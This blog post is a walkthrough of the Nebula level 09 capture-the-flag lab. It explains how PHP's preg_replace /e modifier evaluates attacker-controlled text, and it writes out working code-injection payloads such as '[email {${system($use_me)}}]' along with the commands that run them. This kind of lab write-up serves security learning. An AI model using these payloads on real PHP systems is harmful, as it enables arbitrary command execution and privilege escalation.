---
layout: post
title: "Exploit Exercises - Nebula Level 09"
date: 2014-01-24 11:43:40 +0800
comments: true
categories: 
- Security
- Exercises
- Nebula
---

### About

There's a C setuid wrapper for some vulnerable PHP code...

To do this level, log in as the *level09* account with the password *level09*. Files for this level can be found in /home/flag09. 

### Source code

``` php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

<!-- more -->

### Solution

This php snippet does the following things:

- read the content of file $argv[1]
- replace all the text paterns liket "[email hjc@hanjc.me]" with "hjc AT hanjc dot me"
- replace all the "[" with "<", replace "]" with ">"

At the very first glace, there seems to be no problem about this code (well, turns out to be that anyone who is familiar with php security would recognize immediatly the vulnerability). But what I knew was that if there be something wrong, it must be the php function `preg_replace`.

Google this function and I found many useful thing. There is a [bug report](https://bugs.php.net/bug.php?id=35960) related to this function, and another [article](http://www.madirish.net/402) explains in detail about how to exploit this vulnerability. 

In general, the vulnerability exists when a "\e" is set in the PCRE expression provided to the `preg_replace` function (as in the code above), in this case, php will do normal substitution of backreferences in the replacement string, evaluate it as PHP code, and use the result for replacing the search string, as mentioned [here](http://php.net/manual/en/reference.pcre.pattern.modifiers.php). This link also provides an input string tha could exploit this function, which is 

	<h1>{${eval($_GET[php_code])}}</h1>

As my goal is to run system command with this function, I modified this attack string to be

	[email {${system('touch /home/flag09/test')}}]

Save this string in /tmp/txt, and run the following command 

``` bash
$ /home/flag09/flag09 /tmp/txt noused
```

Although the program produced some errors, the file /home/flag09/test indeed appeared! So this should be a doable way to execute any command, but it is not convenient. Notice there is an additional argument `$use_me` to function `markup` that is never used in the function, the name of this variable indicates its purpose, which is too obvious to ignore. So I modified /tmp/txt to 

	[email {${system($use_me)}}]

Now I could run any command with

``` bash
$ /home/flag09/flag09 /tmp/txt "any command"
```



